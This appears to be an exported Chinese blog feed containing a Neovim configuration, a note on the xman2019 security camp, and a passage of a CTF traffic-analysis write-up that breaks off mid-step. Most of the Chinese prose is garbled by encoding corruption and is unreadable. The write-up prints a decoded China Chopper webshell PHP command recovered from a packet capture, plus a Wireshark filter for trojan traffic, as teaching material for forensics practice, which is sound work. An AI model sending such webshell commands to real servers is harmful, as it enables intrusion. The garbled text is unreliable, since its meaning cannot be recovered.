<h2 id="ä»¥ä¸‹å†…å®¹æ˜¯é…ç½®">ä»¥ä¸‹å†…å®¹æ˜¯é…ç½®</h2>
<h3 id="å®‰è£…ï¼ˆvim-plugï¼‰">å®‰è£…ï¼ˆvim-plugï¼‰</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
<h3 id="config-nvim-init-vim">~/.config/nvim/init.vim</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">" c to caplock , add XKBOPTIONS="caps:escape" in /etc/default/keyboard</span><br><span class="line"></span><br><span class="line">" è®©è¿›å…¥vimçš„æ—¶å€™æ˜¾ç¤ºç»å¯¹è¡Œå·,å½“è¿›å…¥ç¼–è¾‘æ¨¡å¼çš„æ—¶å€™ä¹Ÿæ˜¾ç¤ºç»å¯¹è¡Œå·,ä½†æ˜¯ä»ç¼–è¾‘æ¨¡å¼å›åˆ°æ™®é€šæ¨¡å¼çš„æ—¶å€™åˆ‡æ¢åˆ°ç›¸å¯¹è¡Œå·</span><br><span class="line">set number</span><br><span class="line">augroup relative_numbser</span><br><span class="line"> autocmd!</span><br><span class="line"> autocmd InsertEnter * :set norelativenumber</span><br><span class="line"> autocmd InsertLeave * :set relativenumber</span><br><span class="line">augroup END</span><br><span class="line"></span><br><span class="line">set wildmenu</span><br><span class="line">" å¿½ç•¥å¤§å°å†™</span><br><span class="line">set ignorecase</span><br><span class="line">set shell=/bin/zsh</span><br><span class="line"></span><br><span class="line">" font and icons for vim</span><br><span class="line">set encoding=utf8</span><br><span class="line">" set guifont=DroidSansMono\ Nerd\ Font\ 11</span><br><span class="line">autocmd User Startified setlocal buflisted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">" leaderé”®æ˜ å°„</span><br><span class="line">let mapleader="\&lt;Space&gt;"</span><br><span class="line">map &lt;leader&gt;w :w&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;q :q!&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;r :call Runit()&lt;CR&gt;</span><br><span class="line">" è®¾å®šå‡½æ•°,è‡ªåŠ¨æ ¹æ®æ–‡ä»¶ç±»å‹æ¥è°ƒç”¨ç›¸åº”çš„è§£é‡Šå™¨æ¥æ‰§è¡Œä»£ç </span><br><span class="line">func Runit()</span><br><span class="line">    if &amp;filetype == 'php'</span><br><span class="line">	exec "!time php %"</span><br><span class="line">    elseif &amp;filetype == 'python'</span><br><span class="line">	exec "!time python %"</span><br><span class="line">    elseif &amp;filetype == 'c'</span><br><span class="line">	exec "!gcc % -o %&lt;"</span><br><span class="line">	exec "!time sudo ./%&lt;"</span><br><span class="line">    elseif &amp;filetype == 'cpp'</span><br><span class="line">	exec "!g++ % -o %&lt;"</span><br><span class="line">	exec "!time ./%&lt;"</span><br><span class="line">    endif</span><br><span class="line">endfunc</span><br><span class="line">"</span><br><span class="line">" set shift width</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set scrolloff=6</span><br><span class="line">" å¯åŠ¨é¼ æ ‡</span><br><span class="line">set mouse=n</span><br><span class="line"></span><br><span class="line">map &lt;ScrollWheelUp&gt; &lt;C-Y&gt;</span><br><span class="line">map &lt;ScrollWheelDown&gt; &lt;C-E&gt;</span><br><span class="line"></span><br><span class="line">" å…³äºå¤šçª—å£çš„é”®ä½æ˜ å°„</span><br><span class="line">map vs :vs </span><br><span class="line">map sp :sp </span><br><span class="line">map &lt;leader&gt;l &lt;C-w&gt;l</span><br><span class="line">map &lt;leader&gt;h &lt;C-w&gt;h</span><br><span class="line">map &lt;leader&gt;j &lt;C-w&gt;j</span><br><span class="line">map &lt;leader&gt;k &lt;C-w&gt;k</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;L &lt;C-w&gt;L</span><br><span class="line">map &lt;leader&gt;H &lt;C-w&gt;H</span><br><span class="line">map &lt;leader&gt;J &lt;C-w&gt;J</span><br><span class="line">map &lt;leader&gt;K &lt;C-w&gt;K</span><br><span class="line"></span><br><span class="line">" ç»ˆç«¯æ¨¡å¼</span><br><span class="line">map te :vs&lt;CR&gt;&lt;C-w&gt;L:te&lt;CR&gt;A</span><br><span class="line">tnoremap &lt;esc&gt; &lt;C-\&gt;&lt;C-n&gt;</span><br><span class="line"></span><br><span class="line">" å…³äºå¤šæ ‡ç­¾æ¨¡å¼çš„è®¾å®š</span><br><span class="line">map tn :tabnew </span><br><span class="line">map L :tabnext&lt;CR&gt;</span><br><span class="line">map H :tabprev&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">" ä»£ç æŠ˜å </span><br><span class="line">set foldmethod=indent</span><br><span class="line">set foldlevel=99</span><br><span class="line"></span><br><span class="line">"</span><br><span class="line">" é«˜äº®å½“å‰çš„è¡Œå’Œåˆ—</span><br><span class="line">set cursorcolumn</span><br><span class="line">set cursorline</span><br><span class="line">highlight CursorLine   cterm=NONE ctermbg=black ctermfg=green</span><br><span class="line">highlight CursorColumn cterm=NONE ctermbg=black ctermfg=green </span><br><span class="line"></span><br><span class="line">" è¿™æ®µä»£ç å¯ä»¥è®©æ¯æ¬¡æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å°†å…‰æ ‡å®šä½åˆ°ä¸Šä¸€æ¬¡æ‰€åœ¨çš„ä½ç½®</span><br><span class="line">au BufReadPost * if line("'\"") &gt; 1 &amp;&amp; line("'\"") &lt;= line("$") | exe "normal! g'\"" | endif</span><br><span class="line"></span><br><span class="line">" å¼•å…¥æ’ä»¶</span><br><span class="line">source ~/.vim/plugins.vim</span><br><span class="line">" è¿™ä¸ªæ˜¯ä¸ºäº†åœ¨ç¼–å†™pythonçš„æ—¶å€™æ–¹ä¾¿åœ¨vimå†…éƒ¨æµè§ˆpythonæ–‡æ¡£è€Œæ·»åŠ çš„ï¼Œåœ¨githubä¸Šæœ‰</span><br><span class="line">" source ~/.vim/pydoc.vim/ftplugin/python_pydoc.vim</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugins-vim">~/.vim/plugins.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call plug#begin(&apos;~/.vim/plugged&apos;)</span><br><span class="line"></span><br><span class="line">&quot; ä»£ç è¡¥å…¨æ’ä»¶</span><br><span class="line">&quot; Plug &apos;neoclide/coc.nvim&apos;, &#123;&apos;branch&apos;: &apos;release&apos;&#125;</span><br><span class="line">Plug &apos;ncm2/ncm2&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-jedi&apos; </span><br><span class="line">Plug &apos;ncm2/ncm2-bufword&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-path&apos;</span><br><span class="line">Plug &apos;roxma/nvim-yarp&apos;</span><br><span class="line">Plug &apos;phpactor/phpactor&apos; ,  &#123;&apos;do&apos;: &apos;composer install&apos;, &apos;for&apos;: &apos;php&apos;&#125;</span><br><span class="line">Plug &apos;phpactor/ncm2-phpactor&apos;</span><br><span class="line">&quot; å¤–è§‚æ’ä»¶</span><br><span class="line">Plug &apos;KeitaNakamura/neodark.vim&apos;</span><br><span class="line">Plug &apos;cocopon/iceberg.vim&apos;</span><br><span class="line">Plug &apos;vim-airline/vim-airline&apos;</span><br><span class="line">Plug &apos;ryanoasis/vim-devicons&apos;</span><br><span class="line">&quot; ä»£ç ç»“æ„æ˜¾ç¤º</span><br><span class="line">Plug &apos;vim-scripts/taglist.vim&apos;</span><br><span class="line">&quot; ä»£ç æ ‡è®°,å¹¶ä¸”å¯ä»¥åœ¨æ ‡è®°ä¹‹é—´è·³è½¬</span><br><span class="line">Plug &apos;MattesGroeger/vim-bookmarks&apos;</span><br><span class="line">&quot; ç›®å½•æ ‘</span><br><span class="line">Plug &apos;scrooloose/nerdtree&apos;</span><br><span class="line">&quot; æ‹¬å·è‡ªåŠ¨è¡¥å…¨</span><br><span class="line">Plug &apos;jiangmiao/auto-pairs&apos;</span><br><span class="line">&quot; å¿«é€Ÿæ³¨é‡Š</span><br><span class="line">Plug &apos;scrooloose/nerdcommenter&apos;</span><br><span class="line"> &quot; èŠ±é‡Œèƒ¡å“¨çš„å°æ’ä»¶ï¼Œå¯ä»¥è®©æ‰“å­—å‘å‡ºéŸ³ä¹</span><br><span class="line">&quot; Plug &apos;skywind3000/vim-keysound&apos;</span><br><span class="line">call plug#end()</span><br><span class="line"></span><br><span class="line">&quot; Plugin setting</span><br><span class="line">&quot;</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdtree.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/ncm2.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/bookmark.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/airline.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/taglists.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/autopair.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdcomment.vim</span><br><span class="line">&quot; source ~/.vim/plugset/keysound.vim</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-ncm2-vim">~/.vim/plugset/ncm2.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inoremap &lt;expr&gt; &lt;Tab&gt; pumvisible() ? &quot;\&lt;C-n&gt;&quot; : &quot;\&lt;Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;S-Tab&gt; pumvisible() ? &quot;\&lt;C-p&gt;&quot; : &quot;\&lt;S-Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;CR&gt; (pumvisible() ? &quot;\&lt;c-y&gt;\&lt;cr&gt;&quot;: &quot;\&lt;CR&gt;&quot;)</span><br><span class="line">autocmd BufEnter * call ncm2#enable_for_buffer()</span><br><span class="line">set completeopt=noinsert,menuone,noselect</span><br><span class="line">let ncm2#popup_delay = 5</span><br><span class="line">let g:ncm2#matcher = &quot;substrfuzzy&quot;</span><br><span class="line">let g:ncm2_jedi#python_version = 3</span><br><span class="line">let g:ncm2#match_highlight = &apos;sans-serif&apos;</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-airline-vim">~/.vim/plugset/airline.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;if you want to enable solarized theme ,quote the snipeet</span><br><span class="line">&quot; è¿™æ®µä»£ç è®©vimæ”¯æŒæ’ä»¶æ‰€éœ€çš„è‰²å½©</span><br><span class="line">if (empty($TMUX))</span><br><span class="line">  if (has(&quot;nvim&quot;))</span><br><span class="line">    &quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span><br><span class="line">    let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span><br><span class="line">  endif</span><br><span class="line">  &quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span><br><span class="line">  &quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span><br><span class="line">  &quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span><br><span class="line">  if (has(&quot;termguicolors&quot;))</span><br><span class="line">    set termguicolors</span><br><span class="line">  endif</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">&quot;airline setting </span><br><span class="line">let g:airline_symbols = &#123;&#125;</span><br><span class="line">let g:airline_left_sep = &apos;î‚°&apos;</span><br><span class="line">let g:airline_left_alt_sep = &apos;î‚±&apos;</span><br><span class="line">let g:airline_right_sep = &apos;î‚²&apos;</span><br><span class="line">let g:airline_right_alt_sep = &apos;î‚³&apos;</span><br><span class="line">let g:airline_symbols.branch = &apos;î‚ &apos;</span><br><span class="line">let g:airline_symbols.readonly = &apos;î‚¢&apos;</span><br><span class="line">let g:airline_symbols.linenr = &apos;î‚¡&apos;</span><br><span class="line">let g:airline#extensions#tabline#enabled = 1</span><br><span class="line">let g:airline#extensions#tabline#show_buffers = 0</span><br><span class="line">let g:airline#extensions#tabline#show_tabs = 1</span><br><span class="line">let g:airline#extensions#tabline#fnamemod = &apos;:t&apos;</span><br><span class="line">let g:airline#extensions#tabline#left_sep = &apos; &apos;</span><br><span class="line">let g:airline#extensions#tabline#left_alt_sep = &apos;|&apos;</span><br><span class="line">&quot;</span><br><span class="line">&quot; ä¸»é¢˜è®¾ç½®</span><br><span class="line">&quot; color schema</span><br><span class="line">&quot;ä¸»é¢˜è®¾ç½®ä¸ºå†°å±±ä¸»é¢˜</span><br><span class="line">&quot; colorscheme iceberg </span><br><span class="line">&quot; let g:airline_theme=&apos;iceberg&apos;</span><br><span class="line">&quot; let g:lightline = &#123;&apos;colorscheme&apos;: &apos;iceberg&apos;&#125;</span><br><span class="line">&quot;</span><br><span class="line">&quot; è®¾ç½®ä¸»é¢˜ä¸ºonedark</span><br><span class="line">colorscheme neodark</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-nerdcomment-vim">~/.vim/plugset/nerdcomment.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; comment plugin setting</span><br><span class="line">&quot;comment followed a space</span><br><span class="line">let g:NERDSpaceDelims=1</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-autopair-vim">~/.vim/plugset/autopair.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; autopair setting</span><br><span class="line">let g:AutoPairsShortcutJump = &apos;&lt;S-Tab&gt;&apos;</span><br><span class="line">let g:AutoPairsShortcutFastWrap=&apos;&lt;C-z&gt;&apos;</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-nerdtree-vim">~/.vim/plugset/nerdtree.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; T                 æ‰“å¼€nerdreeçª—å£ï¼Œåœ¨å·¦ä¾§æ æ˜¾ç¤º</span><br><span class="line">map T :NERDTreeToggle&lt;CR&gt;&lt;leader&gt;l</span><br><span class="line"></span><br><span class="line">&quot;close vim if the only window left open is a NERDTree</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br></pre></td></tr></table></figure>
<h4 id="vim-plugset-keysound-vim">~/.vim/plugset/keysound.vim</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;launch with vim</span><br><span class="line">let g:keysound_enable = 1</span><br><span class="line"></span><br><span class="line">&quot;set default sound</span><br><span class="line">let g:keysound_theme = &apos;default&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;typewriter&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;sword&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;mario&apos;</span><br><span class="line">&quot; let g:keysound_theme = &apos;bubble&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; set python version</span><br><span class="line">let g:keysound_py_version = 2</span><br><span class="line"></span><br><span class="line">&quot;volumn setting</span><br><span class="line">&quot; å…¶å®è®¾ç½®è¿™ä¹ˆå¤§,æ—©å°±è¶…è¿‡æé™äº†</span><br><span class="line">let g:keysound_volumn = 100000</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugset-taglists-vim">~/.vim/plugset/taglists.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map &lt;leader&gt;t :TlistToggle&lt;CR&gt; &quot;è®¾ç½®å¬å”¤é”®</span><br><span class="line">let Tlist_WinWidth=30        &quot;è®¾ç½®taglistå®½åº¦</span><br><span class="line">let Tlist_Exit_OnlyWindow=1  &quot;tagListçª—å£æ˜¯æœ€åä¸€ä¸ªçª—å£ï¼Œåˆ™é€€å‡ºVim</span><br><span class="line">let Tlist_Use_Right_Window   = 0</span><br><span class="line"></span><br><span class="line">&quot; ä¸åŒæ—¶æ˜¾ç¤ºå¤šä¸ªæ–‡ä»¶çš„ tag ï¼Œåªæ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„</span><br><span class="line"></span><br><span class="line">&quot; let Tlist_Show_One_File=1</span><br><span class="line"></span><br><span class="line">&quot;è®©å½“å‰ä¸è¢«ç¼–è¾‘çš„æ–‡ä»¶çš„æ–¹æ³•åˆ—è¡¨è‡ªåŠ¨æŠ˜å èµ·æ¥</span><br><span class="line"></span><br><span class="line">let Tlist_File_Fold_Auto_Close=1</span><br></pre></td></tr></table></figure>
<h3 id="vim-plugset-bookmark-vim">~/.vim/plugset/bookmark.vim</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let g:bookmark_sign = &apos;&gt;&gt;&apos;</span><br><span class="line">let g:bookmark_highlight_lines = 1</span><br><span class="line">&quot; unmap mp</span><br><span class="line">nmap mN &lt;Plug&gt;BookmarkPrev</span><br></pre></td></tr></table></figure>
<h2 id="æºç å®¡è®¡">æºç å®¡è®¡</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ctags</span><br><span class="line">#åˆ‡åˆ°å¾…å®¡è®¡æ–‡ä»¶å¤¹ä¸‹çš„æ ¹ç›®å½•ä¸‹,æ‰§è¡Œ</span><br><span class="line">ctags -R</span><br><span class="line">ç”Ÿæˆå…¨å±€çš„æ ‡ç­¾æ–‡ä»¶</span><br><span class="line">ç„¶åæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªä»£ç æ–‡ä»¶,å…‰æ ‡æ”¾åœ¨æŸä¸€ä¸ªå‡½æ•°åæˆ–è€…æ˜¯å®ä¸Š,æŒ‰ä¸‹Ctrl + ], vimå°±å¯ä»¥è‡ªåŠ¨åˆ‡æ¢åˆ°è¯¥å‡½æ•°å®šä¹‰å¤„,è¦è¿”å›åªéœ€è¦æŒ‰ä¸‹Ctrl + o  æˆ–è€… Ctrl + t</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xcape</span><br><span class="line"># make CapsLock behave like Ctrl:</span><br><span class="line">setxkbmap -option ctrl:nocaps</span><br><span class="line"># make short-pressed Ctrl behave like Escape:</span><br><span class="line">xcape -e &apos;Control_L=Escape&apos;</span><br></pre></td></tr></table></figure>
<p>see the link below:</p>
<p><a href="http://tiborsimko.org/capslock-escape-control.html" target="_blank" rel="noopener">http://tiborsimko.org/capslock-escape-control.html</a></p>
<p>ç”±äºè¿™æ ·çš„åšæ³•ä¼šè®©caplockååº”å˜æ…¢,å› æ­¤æˆ‘ä¸ç”¨è¿™ç§æ–¹æ³•,è€Œæ˜¯ä¼ ç»Ÿçš„ä¿®æ”¹keyboardæ–‡ä»¶æ¥è¾¾åˆ°ç®€å•çš„escæ˜ å°„æ•ˆæœ.</p>
]]></content>
      <categories>
        <category>é—²æ¥æ— äº‹</category>
      </categories>
  </entry>
  <entry>
    <title>xman2019</title>
    <url>/2019/08/21/xman2019%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>20å¤šå¤©çš„å¤ä»¤è¥ç”Ÿæ´»,è§è¯†äº†å¾ˆå¤š, ä¹Ÿå¯¹è‡ªå·±çš„å®åŠ›æœ‰äº†ä¸€ä¸ªè¾ƒä¸ºæ¸…æ™°çš„å®šä½(èœçš„ä¸€åŒ¹). å‡ æ¬¡å’Œroisçš„å¤§ä½¬äº¤æµ, æ·±è§‰å¼€å‘èƒ½åŠ›ä¹‹é‡è¦, è¿›è€Œåˆè§‰è‡ªå·±æ•ˆç‡è¿‡ä½, éœ€è¦è­¦æˆ’å•Š.å¾ˆå¤šæ—¶å€™, å‡ºä¸€é“é¢˜æ¯”åšä¸€é“é¢˜è®©äººæ”¶è·æ›´å¤š.</p>
<p>ä¸è¿‡å­¦ä¹ ä¸€ä¸ªå¼€å‘æ¡†æ¶, ä¹Ÿä¸ä¸€å®šéå¾—ä»å¤´åˆ°å°¾ç…§ç€å®˜æ–¹æ–‡æ¡£æ‰“ä¸€é, ä»…ä»…åªæ˜¯ä»å¤´åˆ°å°¾è¿‡ä¸€é, å¿«é€Ÿæ‘¸æ¸…éª¨æ¶, æŸ¥æ‰¾ç›¸å…³çš„å®‰å…¨é—®é¢˜, ä¹Ÿä¸å¤±ä¸ºæ˜¯ä¸€ä¸ªé”»ç‚¼å¿«é€Ÿå­¦ä¹ èƒ½åŠ›çš„å¥½æœºä¼š.</p>
<p>å¤ç°æ–¹é¢, è‡ªå·±ä¹Ÿä¸èƒ½åƒä»¥å‰ä¸€æ ·ä¸€å®šè¦æŠŠæ¯ä¸€é“é¢˜ç›®éƒ½è¦ä»å¤´åˆ°å°¾æ­å»ºç¯å¢ƒç„¶ååœ¨æ¯ä¸€ä¸ªè§£é¢˜ç»†èŠ‚ä¸Šçº ç»“åŠå¤©. æ•ˆç‡å®åœ¨æ˜¯å¤ªå·®, ä¹Ÿè¯¥ä¼šæçº²æŒˆé¢†äº†.</p>
<p>ä»xmanå…¥è¥ä»¥æ¥, æˆ‘ä¸€ç›´éƒ½åœ¨å¿™ç€å¤ç°xctfçš„èµ›äº‹, ä½†æ˜¯ä»å¤´å¤ç°, å®åœ¨æ˜¯ç¹ç. æ ¹æœ¬è·Ÿä¸ä¸Šè¿›åº¦, æ›´ä¸è¦è¯´æˆ‘è¿˜æƒ³å›è¿‡å¤´å»å¤ä¹ ä»¥å‰çš„é¢˜ç›®å‘¢.è¿™ä¸ªæ—¶å€™å°±è§‰å¾—çŸ¥è¯†ç‚¹æ€»ç»“æ€§çš„å¤‡å¿˜å½•å®åœ¨æ˜¯é‡è¦, æ¯æ¬¡åšå®Œé¢˜ç›®ä¹‹å, å–å…¶ç²¾å, çº³å…¥å…¶ä¸­, å›è¿‡å¤´å»åªéœ€è¦ä¸¤çœ¼ä¸‰çœ¼å°±å¯ä»¥å¤ä¹ ,åè§‚è‡ªå·±ä¹‹å‰çš„&quot;é”™é¢˜æœ¬&quot;, å…¶ä¸­çš„å†—ä½™ä¹‹å¤š, æˆ‘éƒ½æƒ³åˆ äº†ä»–.</p>
<p>å·¥å…·æ–¹é¢, å¾ˆé—æ†¾,ä½†æ˜¯ä¸åæ‚”çš„, ä»linuxä¸»ç³»ç»Ÿæ¢å›äº†windows, å›æƒ³ä¹‹å‰ä¸ºä»€ä¹ˆä¼šæŠ˜è…¾ç³»ç»Ÿ, å¤§æ¦‚æ˜¯è‡ªå·±æ²¡æœ‰æŠŠç²¾åŠ›å…¨éƒ¨æ”¾åœ¨åšé¢˜å’Œæé«˜è‡ªå·±å§,æƒ³åˆ°è¿™é‡Œ,æ›´è§‰å¾—æƒ­æ„§.ä»¥åé™¤éåˆšéœ€, å¦åˆ™å†ä¹Ÿä¸ä¼šå»æŠ˜è…¾ä¸€äº›é…ç½®äº†.</p>
<p>å¦å¤–, åœ¨è¿™æ¬¡å¤ä»¤è¥, ä¸è®ºå“ªä½è®²å¸ˆ, éƒ½åœ¨å¼ºè°ƒå¿«é€Ÿå­¦ä¹ çš„èƒ½åŠ›. æˆ‘æ„Ÿè§‰ä¹‹å‰ä¸€å¹´çš„åŠªåŠ›æ–¹å‘å‡ºäº†å·®é”™, åªæ˜¯åœ¨ä½æ•ˆåœ°æ‰©å®½è‡ªå·±çš„çŸ¥è¯†é¢ä½†æ˜¯ä¸æ³¨é‡æé«˜è‡ªå·±å¿«é€Ÿå­¦ä¹ çš„èƒ½åŠ›.</p>
]]></content>
  </entry>
  <entry>
    <title>æµé‡åˆ†æ</title>
    <url>/2019/04/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="ä¸­å›½èœåˆ€">ä¸­å›½èœåˆ€</h3>
<p>ä¸‹è½½æµé‡åŒ…ä¹‹åè¿½è¸ªtcpæµé‡æˆ–è€…httpæµé‡å¯ä»¥åœ¨ç›®å½•ä¸­çœ‹è§flag.tar.gzå­—æ®µ</p>
<p>æ€è·¯1ï¼šbinwalk</p>
<p>å…ˆæŠŠæ•°æ®åŒ…æ–‡ä»¶æ‹–è¿›kaliå­ç³»ç»Ÿä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 caidao/</span><br><span class="line">cd caidao/</span><br><span class="line">chmod 777 caidao.pcapng</span><br><span class="line">binwalk -e caidao.pcapng</span><br><span class="line">cd _caidao.pcapng.extracted/</span><br><span class="line">cat 1E43</span><br></pre></td></tr></table></figure>
<p>æ€è·¯2ï¼šwiresharkæ•°æ®åŒ…è¿½è¸ªï¼ŒæŠŠä¸€ä¸²base64æ‹å‡ºæ¥</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">@ini_set("display_errors","0");</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">if(PHP_VERSION&lt;'5.3.0')</span><br><span class="line">&#123;@set_magic_quotes_runtime(0);&#125;;</span><br><span class="line">echo("X@Y");</span><br><span class="line">$D='C:\\wwwroot\\';</span><br><span class="line">$F=@opendir($D);</span><br><span class="line">if($F==NULL)&#123;echo("ERROR:// Path Not Found Or No Permission!");&#125;</span><br><span class="line">else&#123;$M=NULL;$L=NULL;</span><br><span class="line">while($N=@readdir($F))&#123;$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;&#125;</span><br><span class="line">echo $M.$L;@closedir($F);&#125;;echo("X@Y");die();</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶è¿™æ²¡å•¥ç”¨ã€‚ã€‚</p>
<p>æ•°æ®åŒ…çš„æ•°æ®éƒ½æ˜¯åœ¨line-based text dataé‡Œé¢çš„</p>
<p>ç‚¹å‡»line-based text data,å³å‡»ï¼Œç‚¹å‡»æ˜¾ç¤ºshow packet bytes<br>
é¢ã€‚ã€‚ã€‚æŠŠåƒ\301\213\341è¿™æ ·çš„ç¼–ç å¤„ç†ä¸€ä¸‹ï¼Œä¹‹æ‰€ä»¥startè®¾ç½®ä¸º3ï¼Œæ˜¯å› ä¸ºå‰é¢çš„å¼€å¤´æ˜¯x@yï¼Œä¸æ˜¯base64çš„ä¸œè¥¿ã€‚ã€‚ã€‚è®¾ç½®ä¸ºå¤„ç†æ¨¡å¼ä¸ºå‹ç¼©</p>
<h3 id="è¿™ä¹ˆå¤šæ•°æ®åŒ…">è¿™ä¹ˆå¤šæ•°æ®åŒ…</h3>
<p>åˆ†æï¼Œæ®è¯´å¦‚æœæ˜¯æŒ‚æœ¨é©¬çš„è¯tcpæµä¸­ä¼šæœ‰â€œcommandâ€å­—æ®µ,äºæ˜¯è®¾å®šè¿‡æ»¤è§„åˆ™ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;command&quot;</span><br></pre></td></tr></table></figure>
<p>æ‰¾å‡ºä¸€äº›tcpåŒ…æ¥ï¼Œç„¶åfollowï¼Œæ³¨æ„å¦‚æœæ˜¯ä¹±ç çš„è¯å¯ä»¥å°è¯•ç‚¹ä¸€ç‚¹streamé•¿åº¦ï¼Œè¯´ä¸å®šå°±å¥½äº†<br>
ç„¶åå°±æ‰¾åˆ°äº†flagçš„base64ç </p>
<h3 id="æ‰‹æœºçƒ­ç‚¹">æ‰‹æœºçƒ­ç‚¹</h3>
<p>è“ç‰™åè®®çš„åå­—å«åšobexï¼Œæ‰€ä»¥åœ¨wiresharkä¸­æœç´¢ä¸€ä¸‹æŒ‘å‡ºå‡ ä¸ªåŒ…ï¼Œç„¶åæœ‰ä¸€ä¸ªåŒ…å†™ç€â€œsecret.rarâ€<br>
å¯¼å‡ºæ¥ï¼Œè§£å‹å¾—åˆ°flag</p>
<h3 id="æŠ“åˆ°ä¸€åªè‹è‡">æŠ“åˆ°ä¸€åªè‹è‡</h3>
<p>httpè¿‡æ»¤ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;fly.rar&quot;,</span><br><span class="line">    &quot;appid&quot;:&quot;&quot;,</span><br><span class="line">    &quot;size&quot;:525701,</span><br><span class="line">    &quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;,</span><br><span class="line">    &quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;,</span><br><span class="line">    &quot;sha3&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°äº†è¦ä¼ è¾“çš„æ–‡ä»¶åå­—ã€æ–‡ä»¶çš„md5ç ã€æ–‡ä»¶å¤§å°ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤å‡ºæ¥çš„æ¥ä¸‹æ¥çš„5ä¸ªåˆ†ç‰‡æ•°æ®åŒ…<br>
æ€»é•¿åº¦åŠ èµ·æ¥è¶…è¿‡äº†åŸæ–‡ä»¶çš„æ•°æ®åŒ…å¤§å°ï¼ŒåŸå› æ˜¯é™„åŠ çš„æ–‡ä»¶å¤´ã€‚<br>
å°†è¿™äº›æ•°æ®åŒ…ä¸€ä¸ªä¸€ä¸ªå¯¼å‡º<br>
ç„¶åä½¿ç”¨å‘½ä»¤ï¼š</p>
